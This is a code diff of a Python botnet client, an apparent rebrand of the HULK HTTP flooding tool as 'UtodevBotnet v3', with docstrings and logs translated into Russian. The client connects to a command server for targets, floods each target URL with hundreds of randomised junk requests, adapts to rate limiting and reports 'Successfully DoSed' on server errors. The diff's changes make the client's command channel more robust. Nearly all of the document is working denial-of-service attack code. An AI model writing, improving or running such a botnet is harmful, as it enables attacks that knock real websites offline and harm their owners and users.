@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 
 """
-Hulk v3
+UtodevBotnet v3
 
-The main module of the Hulk v3 which launches the HTTP missiles.
-Each process represents a single bot in the botnet.
+Основной модуль UtodevBotnet v3, который запускает HTTP-атаки.
+Каждый процесс представляет собой отдельного бота в ботнете.
 """
 
 from __future__ import annotations
@@ -36,7 +36,7 @@ if TYPE_CHECKING:
 
 class CustomFilter(logging.Filter):
     """
-    Custom filter to add IP and Port to Logs.
+    Пользовательский фильтр для добавления IP и порта в логи.
     """
 
     def __init__(self) -> None:
@@ -46,20 +46,20 @@ class CustomFilter(logging.Filter):
 
     def update_address(self, address: Tuple[str, int]):
         """
-        Update the IP and Port.
+        Обновить IP и порт.
 
-        :param address: The IP and Port.
+        :param address: IP и порт.
         :type address: Tuple[str, int]
         """
         self._ip, self._port = address
 
     def filter(self, record: logging.LogRecord):
         """
-        Filter the log record.
+        Фильтровать запись лога.
 
-        :param record: The log record to filter.
+        :param record: Запись лога для фильтрации.
         :type record: logging.LogRecord
-        :return: Whether the record should be filtered.
+        :return: Следует ли фильтровать запись.
         :rtype: bool
         """
         record.ip = self._ip
@@ -67,7 +67,7 @@ class CustomFilter(logging.Filter):
         return True
 
 
-LOGGER = logging.getLogger("Hulk_Client")
+LOGGER = logging.getLogger("UtodevBotnet_Client")
 handler = logging.StreamHandler(sys.stdout)
 handler.setFormatter(
     logging.Formatter(
@@ -82,11 +82,11 @@ LOGGER.addFilter(FILTER)
 
 class Missile:
     """
-    The Missile class which will hammer the target with HTTP requests.
+    Класс Missile, который будет атаковать цель HTTP-запросами.
 
-    :param com: The Comms class which is used to communicate with the server.
+    :param com: Класс Comms, используемый для связи с сервером.
     :type com: :class:`Comms`
-    :param target: The target URL to attack.
+    :param target: URL цели для атаки.
     :type target: str
     """
     def __init__(self, com: Comms, target: str):
@@ -99,11 +99,11 @@ class Missile:
     @staticmethod
     def generate_junk(size: int) -> str:
         """
-        Generate random junk data.
+        Генерировать случайные данные.
 
-        :param size: The size of the junk data.
+        :param size: Размер данных.
         :type size: int
-        :return: The random junk data.
+        :return: Случайные данные.
         :rtype: str
         """
         return ''.join(
@@ -115,17 +115,17 @@ class Missile:
 
     async def _launch(self, session: aiohttp.ClientSession) -> int:
         """
-        Launch a single HTTP request and return the response.
+        Запустить один HTTP-запрос и вернуть ответ.
 
-        :param session: The session to use for the request.
+        :param session: Сессия для использования в запросе.
         :type session: :class:`aiohttp.ClientSession`
-        :return: The response status code.
+        :return: Код статуса ответа.
         :rtype: int
         """
         self.count += 1
         FILTER.update_address(self.comms.address)
         LOGGER.info(
-            "Launching attack no. %d on %s",
+            "Запуск атаки № %d на %s",
             self.count, self.url.split('?')[0]
         )
         headers, payload = self._get_payload()
@@ -143,46 +143,46 @@ class Missile:
                     status == 400
                 ]):
                     FILTER.update_address(self.comms.address)
-                    LOGGER.error('\nUrl has DDoS protection.')
+                    LOGGER.error('\nURL защищен от DDoS.')
                     self.comms.send(StatusCodes.ANTI_DDOS)
                 elif status == 403:
                     FILTER.update_address(self.comms.address)
                     LOGGER.error(
-                        '\nUrl is protected. Please retry with another url.'
+                        '\nURL защищен. Попробуйте другой URL.'
                     )
                     self.comms.send(StatusCodes.FORBIDDEN)
                 elif status == 404:
                     FILTER.update_address(self.comms.address)
                     LOGGER.error(
-                        '\nUrl not found. Please retry with another url.'
+                        '\nURL не найден. Попробуйте другой URL.'
                     )
                 elif status == 405:
                     self.method = "get"
                 elif status == 429:
                     FILTER.update_address(self.comms.address)
                     LOGGER.warning(
-                        '\nToo many requests detected. Slowing down a bit.'
+                        '\nОбнаружено слишком много запросов. Замедляем...'
                     )
                     await asyncio.sleep(random.uniform(5.0, 7.5))
                 elif status >= 500:
                     FILTER.update_address(self.comms.address)
-                    LOGGER.info("Successfully DoSed %s!", self.url)
+                    LOGGER.info("Успешно выполнен DoS на %s!", self.url)
                     self.comms.send(StatusCodes.PWNED)
                 elif status >= 400:
                     FILTER.update_address(self.comms.address)
                     LOGGER.warning(
-                        "\nUnknown status code detected.\n%d\n%s",
+                        "\nОбнаружен неизвестный код статуса.\n%d\n%s",
                         status, reason
                     )
             return status
         except aiohttp.ClientConnectorError:
-            return 69
+            return StatusCodes.CONNECTION_FAILURE
 
     def _get_payload(self) -> Tuple[dict, dict]:
         """
-        Generate the payload for the HTTP request.
+        Генерировать полезную нагрузку для HTTP-запроса.
 
-        :return: The headers and payload for the HTTP request.
+        :return: Заголовки и полезная нагрузка для HTTP-запроса.
         :rtype: Tuple[dict, dict]
         """
         ua_list = [
@@ -247,9 +247,9 @@ class Missile:
 
     async def attack(self, count: int):
         """
-        Launch the attack.
+        Запустить атаку.
 
-        :param count: The number of requests to launch.
+        :param count: Количество запросов для запуска.
         :type count: int
         """
         async with aiohttp.ClientSession(
@@ -261,13 +261,17 @@ class Missile:
             ]
             status_list = set(await asyncio.gather(*tasks))
         if all(
-            status < 500 and status not in (403, 404, 69)
+            status < 500 and status not in (
+                StatusCodes.FORBIDDEN,
+                StatusCodes.NOT_FOUND,
+                StatusCodes.CONNECTION_FAILURE
+            )
             for status in status_list
         ):
             FILTER.update_address(self.comms.address)
             LOGGER.info(
-                "Finished Performing %d attacks "
-                "but the target is still intact...",
+                "Выполнено %d атак, "
+                "но цель все еще цела...",
                 self.count
             )
         with contextlib.suppress(ConnectionError):
@@ -285,11 +289,11 @@ class Missile:
 
 class Comms:
     """
-    The class which communicates with the root server.
+    Класс для связи с корневым сервером.
 
-    :param root_ip: The root server's address.
+    :param root_ip: Адрес корневого сервера.
     :type root_ip: str
-    :param root_port: The root server's port.
+    :param root_port: Порт корневого сервера.
     :type root_port: Optional[int]
     """
     def __init__(
@@ -304,30 +308,47 @@ class Comms:
     @property
     def root_server(self):
         """
-        Get the root server socket from given IP and Port.
+        Получить сокет корневого сервера по указанным IP и порту.
 
-        :param root_ip: IP of the root server.
+        :param root_ip: IP корневого сервера.
         :type root_ip: str
-        :param root_port: Port of the root server.
+        :param root_port: Порт корневого сервера.
         :type root_port: Optional[int]
-        :return: The root server socket.
+        :return: Сокет корневого сервера.
         :rtype: socket.socket
         """
         if self._root_server is not None:
             return self._root_server
         root = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        LOGGER.info("Trying to establish connection with Root server.")
-        while True:
+        root.settimeout(5.0)  # Таймаут 5 секунд
+        LOGGER.info("Попытка установить соединение с корневым сервером.")
+        max_attempts = 10
+        attempt = 0
+        while attempt < max_attempts:
             try:
-                with contextlib.suppress(ConnectionError):
-                    root.connect((self.root_ip, self.root_port))
-                    break
+                root.connect((self.root_ip, self.root_port))
+                break
+            except (ConnectionError, socket.timeout, OSError) as e:
+                attempt += 1
+                if attempt < max_attempts:
+                    LOGGER.warning(
+                        "Попытка подключения %d/%d не удалась: %s. Повтор...",
+                        attempt, max_attempts, e
+                    )
+                    import time
+                    time.sleep(1)
+                else:
+                    LOGGER.error(
+                        "Не удалось подключиться после %d попыток. Выход.",
+                        max_attempts
+                    )
+                    sys.exit(1)
             except KeyboardInterrupt:
                 sys.exit(0)
         self._root_server = root
         FILTER.update_address(self.address)
         LOGGER.info(
-            "Connected to root @ [%s:%d]!",
+            "Подключено к корневому серверу @ [%s:%d]!",
             self.root_ip, self.root_port
         )
         root.sendall(f"<{ClientCommands.SEND_TARGET}>".encode())
@@ -336,9 +357,9 @@ class Comms:
     @property
     def address(self):
         """
-        Get the address of the client.
+        Получить адрес клиента.
 
-        :return: The address of the client.
+        :return: Адрес клиента.
         :rtype: str
         """
         if self._root_server is None:
@@ -347,7 +368,7 @@ class Comms:
 
     def close_server(self):
         """
-        Close the root server socket.
+        Закрыть сокет корневого сервера.
         """
         if self._root_server is not None:
             self._root_server.close()
@@ -355,13 +376,25 @@ class Comms:
 
     async def monitor(self):
         """
-        Monitor the root server for commands.
+        Мониторить корневой сервер на наличие команд.
         """
         root = self.root_server
+        root.settimeout(30.0)  # Таймаут 30 секунд для команд
         while True:
             try:
-                command = root.recv(1024)  # message
-                message = command.decode()
+                data = b''
+                while True:
+                    chunk = root.recv(4096)
+                    if not chunk:
+                        break
+                    data += chunk
+                    if len(data) > 65536:  # Макс размер 64KB
+                        LOGGER.error("Сообщение команды слишком большое. Закрытие соединения.")
+                        root.close()
+                        sys.exit(1)
+                    if b'\0' in chunk or len(chunk) < 4096:
+                        break
+                message = data.decode('utf-8', errors='ignore')
                 if message == str(ServerCommands.TERMINATE):
                     for task in self._tasks:
                         task.cancel()
@@ -373,23 +406,52 @@ class Comms:
                         task.cancel()
                     FILTER.update_address(self.address)
                     LOGGER.warning(
-                        "Stopped by the root server.\n"
-                        "Switching to Stand By mode."
+                        "Остановлено корневым сервером.\n"
+                        "Переключение в режим ожидания."
                     )
                     root.sendall(f"<{ClientCommands.STANDBY}>".encode())
                 elif message == str(ServerCommands.READ_TARGET):
-                    target = root.recv(1024).decode()  # Target
+                    # Улучшенное чтение данных с проверкой размера
+                    target_data = b''
+                    root.settimeout(5.0)
+                    try:
+                        while True:
+                            chunk = root.recv(4096)
+                            if not chunk:
+                                break
+                            target_data += chunk
+                            if len(target_data) > 65536:  # Макс размер 64KB
+                                LOGGER.error("URL цели слишком большой. Прерывание.")
+                                break
+                            if b'\0' in chunk or b'\n' in chunk:
+                                break
+                    except socket.timeout:
+                        LOGGER.warning("Таймаут при получении цели.")
+                        continue
+                    except (ConnectionResetError, OSError) as e:
+                        LOGGER.error(f"Ошибка при получении цели: {e}")
+                        raise
+                    
+                    target = target_data.decode('utf-8', errors='ignore').strip()
+                    if not target:
+                        LOGGER.warning("Получена пустая цель. Пропуск.")
+                        continue
                     missile = Missile(self, target)
                     task = asyncio.create_task(
                         missile.attack(500)
                     )
                     self._tasks.append(task)
                     await task
-            except ConnectionResetError:
+            except socket.timeout:
+                FILTER.update_address(self.address)
+                LOGGER.warning("Таймаут при ожидании команды. Повтор...")
+                continue
+            except (ConnectionResetError, ConnectionAbortedError, OSError) as e:
                 FILTER.update_address(self.address)
                 LOGGER.warning(
-                    "Connection with the root server was reset.\n"
-                    "Switching to Stand By mode."
+                    "Соединение с корневым сервером разорвано: %s.\n"
+                    "Переключение в режим ожидания.",
+                    e
                 )
                 self._root_server = None
                 root = self.root_server
@@ -402,9 +464,9 @@ class Comms:
 
     def send(self, status_code: StatusCodes):
         """
-        Send a status code to the root server.
+        Отправить код статуса корневому серверу.
 
-        :param status_code: The status code to send.
+        :param status_code: Код статуса для отправки.
         :type status_code: StatusCodes
         """
         with contextlib.suppress(ConnectionError):
@@ -414,18 +476,18 @@ class Comms:
 
 def modify_parser(parser: argparse.ArgumentParser):
     """
-    Useful for exposing the parser modification to external modules.
+    Полезно для предоставления модификации парсера внешним модулям.
 
-    :param parser: The parser to modify.
+    :param parser: Парсер для модификации.
     :type parser: argparse.ArgumentParser
     """
     def ip_address(arg: argparse.Action):
         """
-        Validate the IP address.
+        Проверить IP-адрес.
 
-        :param arg: The argument to validate.
+        :param arg: Аргумент для проверки.
         :type arg: argparse.Action
-        :return: The validated argument.
+        :return: Проверенный аргумент.
         :rtype: argparse.Action
         """
         ip_pattern = re.compile(
@@ -434,23 +496,23 @@ def modify_parser(parser: argparse.ArgumentParser):
         )
         if not ip_pattern.match(arg):
             raise argparse.ArgumentTypeError(
-                f"{arg} is not a valid IP address."
+                f"{arg} не является действительным IP-адресом."
             )
         return arg
     parser.add_argument(
         '-r', '--root_ip',
-        help='IPv4 Address where Hulk Server is running.',
+        help='IPv4-адрес, где запущен сервер UtodevBotnet.',
         default="localhost",
         type=ip_address
     )
     parser.add_argument(
         '-p', '--root_port',
-        help='Port where Hulk Server is running.',
+        help='Порт, где запущен сервер UtodevBotnet.',
         default=6666
     )
     parser.add_argument(
         '-s', '--stealth',
-        help='Stealth mode.',
+        help='Скрытый режим.',
         action='store_true',
     )
 
